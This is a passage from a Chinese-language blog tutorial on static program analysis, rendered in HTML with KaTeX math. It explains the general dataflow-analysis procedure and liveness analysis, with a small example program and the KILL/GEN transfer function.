class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">t</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">ry</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，设置执行路径上每个节点的状态默认值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><msub><mi>A</mi><mrow><mi>n</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow></msub><mo>=</mo><mrow><mo fence="true">(</mo><mi>T</mi><mo separator="true">,</mo><mi>T</mi><mo separator="true">,</mo><mi>T</mi><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">DATA_{node}=\left( T,T,T,\cdots \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span> 表示任何情况，随后的半格理论中会再次说明。</li><li>确定节点的状态转换函数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>f</mi><mi>v</mi></msub><mo>:</mo><mi mathvariant="bold-italic">S</mi><mo>→</mo><mi mathvariant="bold-italic">S</mi></mrow><annotation encoding="application/x-tex">f_v:\boldsymbol{S}\rightarrow \boldsymbol{S}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.05382em;">S</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6861em;"></span><span class="mord"><span class="mord"><span class="mord boldsymbol" style="margin-right:0.05382em;">S</span></span></span></span></span></span>，具体的函数规则由每个节点的内容决定。</li><li>在控制流汇合处，例如在节点 <code>v</code> 处回合，确定交汇运算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>E</mi><mi>E</mi><msub><mi>T</mi><mi>v</mi></msub><mo>=</mo><msub><mi mathvariant="normal">Π</mi><mrow><mi>w</mi><mo>∈</mo><mrow><mi mathvariant="normal">p</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">d</mi><mo stretchy="false">(</mo></mrow><mi>v</mi><mo stretchy="false">)</mo></mrow></msub><msub><mrow><mi mathvariant="normal">D</mi><mi mathvariant="normal">A</mi><mi mathvariant="normal">T</mi><mi mathvariant="normal">A</mi></mrow><mi>w</mi></msub></mrow><annotation encoding="application/x-tex">MEET_v=\Pi _{w\in \mathrm{pred(}v)}\mathrm{DATA}_w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">MEE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0385em;vertical-align:-0.3552em;"></span><span class="mord"><span class="mord">Π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathrm mtight">pred</span><span class="mopen mtight">(</span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3552em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord mathrm">DATA</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span> 表示当前节点，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>r</mi><mi>e</mi><mi>d</mi><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">pred(v)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">re</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mclose">)</span></span></span></span> 表示当前节点的前驱节点的集合，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>w</mi></mrow><annotation encoding="application/x-tex">w</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span></span></span></span> 指的是前驱节点。我们约定，交汇处会覆盖默认值，也即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mi>i</mi></msub><mi mathvariant="normal">Π</mi><mi>T</mi><mo>=</mo><msub><mi>a</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">a_i\Pi T=a_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">Π</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Π</mi></mrow><annotation encoding="application/x-tex">\Pi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">Π</span></span></span></span> 表示交汇运算。</li><li>如果数据流中某个节点的前驱节点更新了，那么更新该节点。</li><li>如果没有任何节点的状态更新，那么结束执行。</li></ol><p>如果需要深入探讨这个基本流程的性质，一般会包括以下内容：</p><ul><li>Terminating 终止性。符号分析是否会终止，还是一直循环。</li><li>Confluent 合流。这指的是更新节点时的顺序是否会影响到最终的结果。</li></ul><p>以上两者可以笼统的归纳为<strong>符号执行方法是否收敛 (Convergence)</strong>，这将会涉及数理逻辑中形式系统的知识。</p><h1>活跃变量分析</h1><p>Liveness analyze 活跃变量分析在编译器、垃圾回收机制中非常常见。对于给定的程序，对于语句 S，变量 V 定义在语句 S 之前，如果 V 的值在执行 S 语句之后还会被读取，那么 V 就是活跃变量。这里需要额外注意的是，活跃变量并不是根据变量名来区分的，而是根据变量实际代表的对象(例如指针指向的值)来区分变量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var x,y,z;</span><br><span class="line">x = input;</span><br><span class="line"><span class="keyword">while</span> (x&gt;<span class="number">1</span>) &#123;</span><br><span class="line">y = x/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (y&gt;<span class="number">3</span>) x = x-y;</span><br><span class="line">z = x<span class="number">-4</span>;</span><br><span class="line"><span class="keyword">if</span> (z&gt;<span class="number">0</span>) x = x/<span class="number">2</span>;</span><br><span class="line">z = z<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">output x;</span><br></pre></td></tr></table></figure><p>例如第四行的变量 y 被覆盖了，那么指向第四行之前的变量 y 和执行第四行之和的变量 y，是不同的变量，而且在 y 的值变化的过程中，原来的 y 没有被读取。所以在第一行确定的变量 y 不是活跃变量。</p><p>但是第 9 行的变量 z，是活跃变量，尽管它被覆盖了，但是在覆盖之前读取了 z 的值。</p><p>活跃变量的分析属于 may 分析，归纳为活跃变量的变量，在后续的执行中可能就不是活跃变量了，因此，<strong>一般从程序结束的出口开始分析活跃变量</strong>。</p><p><img src="https://cdn.blog-blockchain.xyz/202204041350944.png" alt="image-20220404135039856"></p><p>对于执行路径的每个节点，我们给出每个节点活跃变量的集合 ，然后从出口倒着向入口分析，在不同控制流的<strong>交汇处取并集</strong>，这样就可以得到满足 “变量在当前语句之和会被读取” 的性质。</p><p>最后总结一般流程：</p><ol><li><p>初始化出口处的活跃变量为空 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><msub><mi>A</mi><mi>V</mi></msub><mo>=</mo><mrow><mo fence="true">{</mo><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">DATA_V=\left\{  \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span>，</p></li><li><p>定义从后往前时每个节点的活跃变量的转换函数</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>L</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">(</mo><mi>L</mi><mo>−</mo><msub><mrow><mi mathvariant="normal">K</mi><mi mathvariant="normal">I</mi><mi mathvariant="normal">L</mi><mi mathvariant="normal">L</mi></mrow><mi>v</mi></msub><mo fence="true">)</mo></mrow><mo>∪</mo><mi>G</mi><mi>E</mi><msub><mi>N</mi><mi>v</mi></msub><mspace linebreak="newline"></mspace><mi>s</mi><mi mathvariant="normal">.</mi><mi>t</mi><mi mathvariant="normal">.</mi><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msub><mrow><mi mathvariant="normal">K</mi><mi mathvariant="normal">I</mi><mi mathvariant="normal">L</mi><mi mathvariant="normal">L</mi></mrow><mi>v</mi></msub><mo>=</mo><mrow><mo fence="true">{</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mtext>被覆盖 </mtext><mrow><mi mathvariant="normal">o</mi><mi mathvariant="normal">r</mi></mrow><mtext> </mtext><mi>x</mi><mtext>被重定义</mtext><mo fence="true">}</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>G</mi><mi>E</mi><msub><mi>N</mi><mi>v</mi></msub><mo>=</mo><mrow><mo fence="true">{</mo><mi>x</mi><mi mathvariant="normal">∣</mi><mi>x</mi><mtext>被读取</mtext><mo fence="true">}</mo></mrow></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f_v(L)=\left( L-\mathrm{KILL}_v \right) \cup GEN_v\\s.t.\begin{cases}\mathrm{KILL}_v=\left\{ x|x\text{被覆盖} \ \mathrm{or} \ x\text{被重定义} \right\}\\GEN_v=\left\{ x|x\text{被读取} \right\}\\\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">KILL</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">GE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord mathnormal">s</span><span class="mord">.</span><span class="mord mathnormal">t</span><span class="mord">.</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.69em;"><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord"><span class="mord mathrm">KILL</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord text"><span class="mord cjk_fallback">被覆盖</span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">or</span></span><span class="mspace"> </span><span class="mord mathnormal">x</span><span class="mord text"><span class="mord cjk_fallback">被重定义</span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">GE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">x</span><span class="mord">∣</span><span class="mord mathnormal">x</span><span class="mord text"><span class="mord cjk_fallback">被读取</span></span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.19em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 表示当前节点从后继节点获取的活跃变量的集合，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi mathvariant="normal">K</mi><mi mathvariant="normal">I</mi><mi mathvariant="normal">L</mi><mi mathvariant="normal">L</mi></mrow><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">\mathrm{KILL}_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">KILL</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是需要在活跃变量集合中删除的变量，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mi>E</mi><msub><mi>N</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">GEN_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">GE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.109em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是当前节点 v 处产生的新的活跃变量。</p></li><li><p>交汇处运算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi>E</mi><mi>E</mi><msub><mi>T</mi><mi>V</mi></msub><mo>=</mo><msub><mo>⋃</mo><mrow><mi>w</mi><mo>∈</mo><mi mathvariant="normal">succ</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>v</mi><mo stretchy="false">)</mo></mrow></msub><mi>D</mi><mi>A</mi><mi>T</mi><msub><mi>A</mi><mi>w</mi></msub></mrow><annotation encoding="application/x-tex">MEET_{V}=\bigcup_{w \in \operatorname{succ}(v)} D A T A_{w}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">MEE</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2247em;vertical-align:-0.4747em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">⋃</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2253em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span><span class="mrel mtight">∈</span><span class="mop mtight"><span class="mord mathrm mtight">succ</span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4747em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，表示后继节点的状态的并集。</p></li><li><p>更新活跃变量集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>L</mi><mi>v</mi></msub><mo>=</mo><msub><mi>f</mi><mi>v</mi></msub><mrow><mo fence="true">(</mo><mi>M</mi><mi>E</mi><mi>E</mi><msub><mi>T</mi><mi>v</mi></msub><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">L_{v}=f_{v}\left(M E E T_{v}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" 